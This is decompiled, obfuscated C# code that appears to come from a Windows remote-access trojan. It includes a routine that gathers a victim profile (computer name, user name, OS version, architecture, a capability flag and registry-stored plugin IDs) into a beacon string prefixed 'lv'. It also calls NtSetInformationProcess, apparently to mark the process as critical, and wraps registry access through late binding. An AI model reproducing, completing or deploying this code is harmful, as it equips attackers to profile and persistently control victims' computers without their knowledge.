using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns2;
using ns3;
using ns6;
using ns7;
using ns8;

namespace ns5;

internal class Class24
{
	static void smethod_0(Class13.Class22 class22_0)
	{
		class22_0.int_0 = (class22_0.byte_0[class22_0.int_4] << 5) ^ class22_0.byte_0[class22_0.int_4 + 1];
	}

	static Class13.Class17 smethod_1(Class13.Class18 class18_0)
	{
		byte[] array = new byte[class18_0.int_4];
		Array.Copy(class18_0.byte_1, class18_0.int_3, array, 0, class18_0.int_4);
		return new Class13.Class17(array);
	}

	unsafe static bool smethod_2(Class13.Class14 class14_0)
	{
		void* ptr = stackalloc byte[13];
		int num = Class24.smethod_166(class14_0.class16_0);
		while (true)
		{
			if (num >= 258)
			{
				*(int*)((byte*)ptr + 8) = class14_0.int_4;
				switch (*(int*)((byte*)ptr + 8))
				{
				case 7:
				{
					int num2;
					while (((num2 = Class24.smethod_51(class14_0.class17_0, class14_0.class15_0)) & -256) == 0)
					{
						Class24.smethod_175(class14_0.class16_0, num2);
						if (--num >= 258)
						{
							continue;
						}
						goto IL_01e3;
					}
					if (num2 >= 257)
					{
						class14_0.int_6 = Class13.Class14.int_0[num2 - 257];
						class14_0.int_5 = Class13.Class14.int_1[num2 - 257];
						goto case 8;
					}
					if (num2 < 0)
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					class14_0.class17_1 = null;
					class14_0.class17_0 = null;
					class14_0.int_4 = 2;
					((byte*)ptr)[12] = 1;
					break;
				}
				case 8:
					if (class14_0.int_5 > 0)
					{
						class14_0.int_4 = 8;
						*(int*)ptr = Class24.smethod_125(class14_0.class15_0, class14_0.int_5);
						if (*(int*)ptr < 0)
						{
							((byte*)ptr)[12] = 0;
							break;
						}
						Class24.smethod_145(class14_0.class15_0, class14_0.int_5);
						class14_0.int_6 += *(int*)ptr;
					}
					class14_0.int_4 = 9;
					goto case 9;
				case 9:
				{
					int num2 = Class24.smethod_51(class14_0.class17_1, class14_0.class15_0);
					if (num2 >= 0)
					{
						class14_0.int_7 = Class13.Class14.int_2[num2];
						class14_0.int_5 = Class13.Class14.int_3[num2];
						goto case 10;
					}
					((byte*)ptr)[12] = 0;
					break;
				}
				case 10:
					if (class14_0.int_5 > 0)
					{
						class14_0.int_4 = 10;
						*(int*)((byte*)ptr + 4) = Class24.smethod_125(class14_0.class15_0, class14_0.int_5);
						if (*(int*)((byte*)ptr + 4) < 0)
						{
							((byte*)ptr)[12] = 0;
							break;
						}
						Class24.smethod_145(class14_0.class15_0, class14_0.int_5);
						class14_0.int_7 += *(int*)((byte*)ptr + 4);
					}
					Class24.smethod_197(class14_0.class16_0, class14_0.int_6, class14_0.int_7);
					num -= class14_0.int_6;
					class14_0.int_4 = 7;
					continue;
				default:
					continue;
					IL_01e3:
					((byte*)ptr)[12] = 1;
					break;
				}
			}
			else
			{
				((byte*)ptr)[12] = 1;
			}
			break;
		}
		return ((byte*)ptr)[12] != 0;
	}

	static RegistryKey smethod_3(Class0 class0_0, string string_0)
	{
		if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { text, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return (RegistryKey)obj2;
		}
		if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array5 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array5, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj4;
		}
		if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array6 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "OpenSubKey", array6, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj6;
		}
		if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj7 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array7 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "OpenSubKey", array7, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj8;
		}
		return null;
	}

	static string smethod_4(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.string_0;
	}

	static void smethod_5(Class13.Class19 class19_0, byte[] byte_0)
	{
		Class24.smethod_23(class19_0.class22_0, byte_0);
	}

	static void smethod_6(Class0 class0_0)
	{
		try
		{
			Class24.smethod_102(class0_0, new string(new char[3] { 'r', 's', 'c' }));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_7(int int_0, string string_0, Graphics graphics_0, Font font_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	unsafe static int smethod_8(Class13.Class19 class19_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = byte_0.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class24.smethod_101(class19_0.class23_0, byte_0, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			class19_0.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) != 0 && class19_0.int_0 != 30)
			{
				Class13.Class22 class22_ = class19_0.class22_0;
				((byte*)ptr)[24] = (((class19_0.int_0 & 4) != 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[25] = (((class19_0.int_0 & 8) != 0) ? ((byte)1) : ((byte)0));
				if (Class24.smethod_103(((byte*)ptr)[25] != 0, ((byte*)ptr)[24] != 0, class22_))
				{
					continue;
				}
				if (class19_0.int_0 != 16)
				{
					if (class19_0.int_0 == 20)
					{
						*(int*)((byte*)ptr + 16) = 8 + (-Class24.smethod_177(class19_0.class23_0) & 7);
						while (*(int*)((byte*)ptr + 16) > 0)
						{
							Class24.smethod_188(class19_0.class23_0, 2, 10);
							*(int*)((byte*)ptr + 16) -= 10;
						}
						class19_0.int_0 = 16;
					}
					else if (class19_0.int_0 == 28)
					{
						Class24.smethod_29(class19_0.class23_0);
						class19_0.int_0 = 30;
					}
					continue;
				}
				*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
				break;
			}
			*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
			break;
		}
		return *(int*)((byte*)ptr + 20);
	}

	static int smethod_9(Class13.Class16 class16_0)
	{
		return class16_0.int_1;
	}

	unsafe static bool smethod_10(FileInfo fileInfo_0, FileInfo fileInfo_1, Class0 class0_0)
	{
		void* ptr = stackalloc byte[2];
		if (Operators.CompareString(fileInfo_1.get_Name().ToLower(), fileInfo_0.get_Name().ToLower(), false) != 0)
		{
			((byte*)ptr)[1] = 0;
		}
		else
		{
			DirectoryInfo directoryInfo = fileInfo_1.Directory;
			DirectoryInfo directoryInfo2 = fileInfo_0.Directory;
			while (true)
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo != null)
						{
							if (directoryInfo2 == null)
							{
								((byte*)ptr)[1] = 0;
								break;
							}
							continue;
						}
						((byte*)ptr)[1] = 0;
						break;
					}
					((byte*)ptr)[1] = 1;
					break;
				}
				((byte*)ptr)[1] = 0;
				break;
			}
		}
		return ((byte*)ptr)[1] != 0;
	}

	unsafe static int smethod_11(int int_0, Class13.Class20 class20_0)
	{
		void* ptr = stackalloc byte[8];
		if (int_0 == 255)
		{
			*(int*)((byte*)ptr + 4) = 285;
		}
		else
		{
			*(int*)ptr = 257;
			while (int_0 >= 8)
			{
				*(int*)ptr += 4;
				int_0 >>= 1;
			}
			*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		}
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_12(EventHandler eventHandler_0, Class28 class28_0)
	{
		EventHandler eventHandler = class28_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class28_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	unsafe static int smethod_13(Class28 class28_0, string string_0)
	{
		void* ptr = stackalloc byte[18];
		try
		{
			((byte*)ptr)[16] = ((class28_0.char_0[0] == '\u0001') ? ((byte)1) : ((byte)0));
			if (string_0 != null && string_0.Length != 0 && (((byte*)ptr)[16] == 0 || string_0.Length <= 4) && (((byte*)ptr)[16] != 0 || string_0[0] == '#'))
			{
				*(int*)ptr = 0;
				*(int*)((byte*)ptr + 4) = string_0.Length - 1;
				while (true)
				{
					if (*(int*)((byte*)ptr + 4) >= 0 && (((byte*)ptr)[16] != 0 || *(int*)((byte*)ptr + 4) != 0))
					{
						char c = string_0[*(int*)((byte*)ptr + 4)];
						((byte*)ptr)[17] = 0;
						*(int*)((byte*)ptr + 8) = 0;
						while (*(int*)((byte*)ptr + 8) < class28_0.char_0.Length)
						{
							if (class28_0.char_0[*(int*)((byte*)ptr + 8)] != c)
							{
								(*(int*)((byte*)ptr + 8))++;
								continue;
							}
							*(int*)ptr = *(int*)ptr * class28_0.char_0.Length + *(int*)((byte*)ptr + 8);
							((byte*)ptr)[17] = 1;
							break;
						}
						if (((byte*)ptr)[17] != 0)
						{
							(*(int*)((byte*)ptr + 4))--;
							continue;
						}
						*(int*)((byte*)ptr + 12) = -1;
						break;
					}
					*(int*)((byte*)ptr + 12) = *(int*)ptr;
					break;
				}
			}
			else
			{
				*(int*)((byte*)ptr + 12) = -1;
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 12) = -1;
		}
		return *(int*)((byte*)ptr + 12);
	}

	[DllImport("kernel32.dll")]
	static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_0);

	static bool smethod_14(Class13.Class20 class20_0, int int_0)
	{
		class20_0.short_0[class20_0.int_1] = 0;
		class20_0.byte_1[class20_0.int_1++] = (byte)int_0;
		short[] short_;
		short[] array = (short_ = class20_0.class21_0.short_0);
		nint num = int_0;
		array[int_0] = (short)(short_[num] + 1);
		return Class24.smethod_53(class20_0);
	}

	static void smethod_15(Class0 class0_0, int int_0)
	{
		try
		{
			Class24.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_16(Form1 form1_0)
	{
		((Control)form1_0).SuspendLayout();
		((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_1).set_Size(new Size(100, 24));
		((Control)form1_0.button_1).set_Location(new Point(408 - ((Control)form1_0.button_1).get_Width(), 188));
		((Control)form1_0.button_1).set_TabIndex(0);
		((Control)form1_0.button_1).set_Text("&Quit");
		((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
		((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_0).set_Size(new Size(100, 24));
		((Control)form1_0.button_0).set_Location(new Point(((Control)form1_0.button_1).get_Left() - ((Control)form1_0.button_0).get_Width() - 6, 188));
		((Control)form1_0.button_0).set_TabIndex(1);
		((Control)form1_0.button_0).set_Text("&Continue");
		((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
		((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form1_0.control2_0).SetBounds(6, 186, 120, 32);
		Class24.smethod_113(form1_0.control1_0, Enum1.const_2);
		((Control)form1_0.class35_0).set_Anchor((AnchorStyles)13);
		((Control)form1_0.class35_0).set_Location(new Point(20, 72));
		((Control)form1_0.class35_0).set_Size(new Size(382, 13));
		((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form1_0).set_ClientSize(new Size(418, 224));
		((Form)form1_0).set_ControlBox(false);
		((Control)form1_0).get_Controls().AddRange((Control[])(object)new Control[5]
		{
			form1_0.control2_0,
			(Control)form1_0.button_0,
			(Control)form1_0.button_1,
			form1_0.control1_0,
			(Control)form1_0.class35_0
		});
		((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form1_0).set_MaximizeBox(false);
		((Form)form1_0).set_MinimizeBox(false);
		((Form)form1_0).set_ShowInTaskbar(false);
		((Form)form1_0).set_StartPosition((FormStartPosition)1);
		((Control)form1_0).ResumeLayout(false);
	}

	static void smethod_17(Class13.Class20 class20_0)
	{
		class20_0.int_1 = 0;
		class20_0.int_2 = 0;
	}

	unsafe static bool smethod_18(Class13.Class14 class14_0)
	{
		void* ptr = stackalloc byte[13];
		switch (class14_0.int_4)
		{
		case 2:
			if (class14_0.bool_0)
			{
				class14_0.int_4 = 12;
				((byte*)ptr)[12] = 0;
				break;
			}
			*(int*)ptr = Class24.smethod_125(class14_0.class15_0, 3);
			if (*(int*)ptr < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class24.smethod_145(class14_0.class15_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class14_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class24.smethod_47(class14_0.class15_0);
				class14_0.int_4 = 3;
				break;
			case 1:
				class14_0.class17_0 = Class13.Class17.class17_0;
				class14_0.class17_1 = Class13.Class17.class17_1;
				class14_0.int_4 = 7;
				break;
			case 2:
				class14_0.class18_0 = new Class13.Class18();
				class14_0.int_4 = 6;
				break;
			}
			((byte*)ptr)[12] = 1;
			break;
		case 3:
			if ((class14_0.int_8 = Class24.smethod_125(class14_0.class15_0, 16)) < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class24.smethod_145(class14_0.class15_0, 16);
			class14_0.int_4 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class24.smethod_125(class14_0.class15_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class24.smethod_145(class14_0.class15_0, 16);
			class14_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class24.smethod_50(class14_0.class16_0, class14_0.class15_0, class14_0.int_8);
			class14_0.int_8 -= *(int*)((byte*)ptr + 8);
			if (class14_0.int_8 == 0)
			{
				class14_0.int_4 = 2;
				((byte*)ptr)[12] = 1;
			}
			else
			{
				((byte*)ptr)[12] = ((!Class24.smethod_62(class14_0.class15_0)) ? ((byte)1) : ((byte)0));
			}
			break;
		case 6:
			if (!Class24.smethod_76(class14_0.class18_0, class14_0.class15_0))
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			class14_0.class17_0 = Class24.smethod_117(class14_0.class18_0);
			class14_0.class17_1 = Class24.smethod_1(class14_0.class18_0);
			class14_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			((byte*)ptr)[12] = (Class24.smethod_2(class14_0) ? ((byte)1) : ((byte)0));
			break;
		default:
			((byte*)ptr)[12] = 0;
			break;
		case 12:
			((byte*)ptr)[12] = 0;
			break;
		}
		return ((byte*)ptr)[12] != 0;
	}

	unsafe static string smethod_19(object object_0)
	{
		void* ptr = stackalloc byte[46];
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int)
			{
				*(int*)((byte*)ptr + 32) = (int)object_0;
				return ((int*)((byte*)ptr + 32))->ToString("x");
			}
			if (object_0 is long)
			{
				*(long*)ptr = (long)object_0;
				return ((long*)ptr)->ToString("x");
			}
			if (object_0 is short)
			{
				*(short*)((byte*)ptr + 40) = (short)object_0;
				return ((short*)((byte*)ptr + 40))->ToString("x");
			}
			if (object_0 is uint)
			{
				*(uint*)((byte*)ptr + 36) = (uint)object_0;
				return ((uint*)((byte*)ptr + 36))->ToString("x");
			}
			if (object_0 is ulong)
			{
				*(ulong*)((byte*)ptr + 8) = (ulong)object_0;
				return ((ulong*)((byte*)ptr + 8))->ToString("x");
			}
			if (object_0 is ushort)
			{
				*(ushort*)((byte*)ptr + 42) = (ushort)object_0;
				return ((ushort*)((byte*)ptr + 42))->ToString("x");
			}
			if (object_0 is byte)
			{
				((byte*)ptr)[44] = (byte)object_0;
				return ((byte*)ptr)[44].ToString("x");
			}
			if (object_0 is sbyte)
			{
				((byte*)ptr)[45] = (byte)(sbyte)object_0;
				return ((sbyte*)((byte*)ptr + 45))->ToString("x");
			}
			if (object_0 is IntPtr intPtr)
			{
				*(long*)((byte*)ptr + 16) = intPtr.ToInt64();
				return ((long*)((byte*)ptr + 16))->ToString("x");
			}
			if (object_0 is UIntPtr)
			{
				*(ulong*)((byte*)ptr + 24) = ((UIntPtr)object_0).ToUInt64();
				return ((ulong*)((byte*)ptr + 24))->ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static string smethod_20(Class0 class0_0)
	{
		string text = new string(new char[2] { 'l', 'v' }) + class0_0.string_8;
		try
		{
			if (Operators.CompareString(Class24.smethod_162(class0_0, "vn"), "", false) == 0)
			{
				string text2 = text;
				string string_ = Class24.smethod_173(class0_0, ref class0_0.string_0) + new string(new char[1] { '_' }) + Class24.smethod_156(class0_0);
				text = text2 + Class24.smethod_134(class0_0, ref string_) + class0_0.string_8;
			}
			else
			{
				string text3 = text;
				string string_ = Class24.smethod_162(class0_0, "vn");
				string string_2 = Class24.smethod_173(class0_0, ref string_) + "_" + Class24.smethod_156(class0_0);
				text = text3 + Class24.smethod_134(class0_0, ref string_2) + class0_0.string_8;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string text4 = text;
			string string_2 = Class24.smethod_156(class0_0);
			text = text4 + Class24.smethod_134(class0_0, ref string_2) + class0_0.string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + class0_0.string_8;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			text = text + new string(new char[2] { '?', '?' }) + class0_0.string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + class0_0.string_8;
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			text = text + new string(new char[2] { '?', '?' }) + class0_0.string_8;
			ProjectData.ClearProjectError();
		}
		text = text + Class24.smethod_203(class0_0) + class0_0.string_8;
		try
		{
			text = text + Class24.smethod_45(7u, class0_0) + class0_0.string_8;
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			text = text + new string(new char[1] { 'X' }) + class0_0.string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Info", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OSFullName", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Microsoft", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Windows", "Win" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "®", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "™", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "  ", " " }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { " Win", "Win" }, (string[])null, (Type[])null, (bool[])null)));
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			text += new string(new char[2] { '?', '?' });
			ProjectData.ClearProjectError();
		}
		text += new string(new char[2] { 'S', 'P' });
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, new string(new char[1] { ' ' }), -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += new string(new char[1] { '0' });
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			text += new string(new char[1] { '0' });
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(new string(new char[3] { 'x', '8', '6' }))) ? (text + new string(new char[4] { ' ', 'x', '8', '6' }) + class0_0.string_8) : (text + new string(new char[4] { ' ', 'x', '6', '4' }) + class0_0.string_8));
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			text += class0_0.string_8;
			ProjectData.ClearProjectError();
		}
		text = ((!Class24.smethod_41(class0_0)) ? (text + new string(new char[2] { 'N', 'o' }) + class0_0.string_8) : (text + new string(new char[3] { 'Y', 'e', 's' }) + class0_0.string_8));
		text = text + class0_0.string_1 + class0_0.string_8;
		text = text + new string(new char[2] { '.', '.' }) + class0_0.string_8;
		text = text + Class24.smethod_94(class0_0) + class0_0.string_8;
		string text5 = "";
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[2]
				{
					new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + class0_0.string_5,
					false
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text6 = Conversions.ToString(enumerator.Current);
					if (text6.Length == 32)
					{
						text5 = text5 + text6 + new string(new char[1] { ',' });
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	static bool smethod_21(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_0;
	}

	static void smethod_22(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class24.smethod_144(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	[DllImport("kernel32.dll")]
	static extern void GetSystemInfo(ref Class39.Struct20 struct20_0);

	static void smethod_23(Class13.Class22 class22_0, byte[] byte_0)
	{
		class22_0.byte_1 = byte_0;
		class22_0.int_7 = 0;
		class22_0.int_8 = byte_0.Length;
	}

	static Exception smethod_24(EventArgs0 eventArgs0_0)
	{
		return eventArgs0_0.exception_0;
	}

	static Class39.Struct19 smethod_25()
	{
		if (!Class39.bool_0)
		{
			Class39.struct19_0 = default(Class39.Struct19);
			try
			{
				Class39.struct19_0.int_0 = Marshal.SizeOf(typeof(Class39.Struct19));
				Class24.GetVersionEx(ref Class39.struct19_0);
				Class39.bool_0 = true;
			}
			catch
			{
			}
		}
		return Class39.struct19_0;
	}

	static void smethod_26(Class13.Stream0 stream0_0, int int_0)
	{
		Class24.smethod_148(stream0_0, int_0);
		Class24.smethod_148(stream0_0, int_0 >> 16);
	}

	static bool smethod_27(Class32 class32_0)
	{
		return class32_0.bool_0;
	}

	static void smethod_28(Class28 class28_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class24.smethod_40(class28_0, tempFileName);
			string path = Class24.smethod_72();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class28_0.eventHandler_0 != null)
			{
				class28_0.eventHandler_0(class28_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception exception_)
		{
			Class24.smethod_168(class28_0, new EventArgs0(exception_));
		}
	}

	static void smethod_29(Class13.Class23 class23_0)
	{
		if (class23_0.int_2 > 0)
